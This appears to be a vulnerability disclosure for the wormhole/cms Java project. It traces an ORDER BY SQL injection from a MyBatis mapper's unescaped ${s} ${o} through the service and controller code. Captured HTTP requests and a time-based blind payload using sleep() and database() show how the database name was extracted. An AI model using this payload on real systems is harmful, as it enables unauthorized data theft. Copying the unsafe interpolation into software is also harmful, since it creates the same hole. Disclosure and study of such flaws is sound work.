**BUG_Author:**

hadagaga

**Vendor:**

https://github.com/wormhole/cms

**Software:**

https://github.com/wormhole/cms

**Vulnerability File:**

src/main/resources/mapper/RoleMapper.xml

```xml
    <select id="selectWithQuery" resultMap="baseMap">
        select * from `role`
        <include refid="where"/>
        <if test="sortWrapper != null and sortWrapper.size() > 0">
            order by
            <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                `${s}` ${o}
            </foreach>
        </if>
        <if test="offset != null and limit != null">
            limit #{offset}, #{limit}
        </if>
    </select>
```

​	Here we can see that S and O are suspicious injection points, and we can trace back to find that this select statement is called in multiple places. After the audit, it is determined that there is a call in the following method, and the parameters s and o are controllable, and other methods do not use the definition of the order by statement, although where is used, the column parameter is uncontrollable, so there is no SQL injection.

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public PageResponse<RoleDTO> findByPage(Integer page, Integer limit, String sort, String order, String key) {
        Set<String> roleIds = new HashSet<>();

        QueryWrapperBuilder builder = new QueryWrapperBuilder();
        builder.sort("builtin", "desc");
        if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
            builder.sort("name", "asc");
        } else {
            builder.sort(sort, order);
        }
        builder.like(!StringUtils.isEmpty(key), key, Arrays.asList("name", "note"));
        builder.page((page - 1) * limit, limit);
        builder.in("id", new ArrayList<>(roleIds));
        QueryWrapper wrapper = builder.build();

        List<Role> roles = roleDAO.selectWithQuery(wrapper);
        Integer total = roleDAO.countWithQuery(wrapper);

        List<RoleDTO> dtos = new ArrayList<>();
        for (Role role : roles) {
            RoleDTO dto = new RoleDTO();
            BeanUtils.copyProperties(role, dto);
            dtos.add(dto);
        }
        return new PageResponse<>(total, dtos);
    }
```

​	After auditing, we found that in this method, the sort and order parameters are put into the builder object in this code block, and there is no processing to prevent SQL injection before that, and these two parameters are the o and s in the xml document, so there is a SQL injection here.

```java
if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
    builder.sort("name", "asc");
} else {
    builder.sort(sort, order);
}
```

​	This method is called by the following controller:

```java
    @GetMapping(value = "/list")
    public ResponseEntity<Result<PageResponse<RoleDTO>>> queryPage(
            @RequestParam(value = "page") @Min(value = 1, message = "page不能小于1") Integer page,
            @RequestParam(value = "limit") @Min(value = 1, message = "limit不能小于1") Integer limit,
            @RequestParam(value = "sort", required = false) String sort,
            @RequestParam(value = "order", required = false) String order,
            @RequestParam(value = "key", required = false) String key) {
        PageResponse<RoleDTO> response = roleService.findByPage(page, limit, sort, order, key);
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(response));
    }
```

​	It can be seen that there is no processing here, and the parameters are passed directly into the findByPage method. Then we locate the role management module of the front-end, capture the packets after access, and capture the following packets.

```http
GET /auth/role/list?page=1&limit=10 HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close
```

​	Construct the parameters sort and order

```http
GET /auth/role/list?page=1&limit=10&sort=builtin&order=desc HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close
```

​	Based on the definition in the XML document, we construct the following payload:

sort:

```sql
builtin%60,if(length((select%20database()))=1,sleep(0.5),1),%60builtin
```

order:

```sql
desc
```

​	The following data is obtained by blasting using the BP blasting module:

![image-20241216113807251](img/image-20241216113807251.png)

​	After processing, the library name is obtained:

![image-20241216113932096](img/image-20241216113932096.png)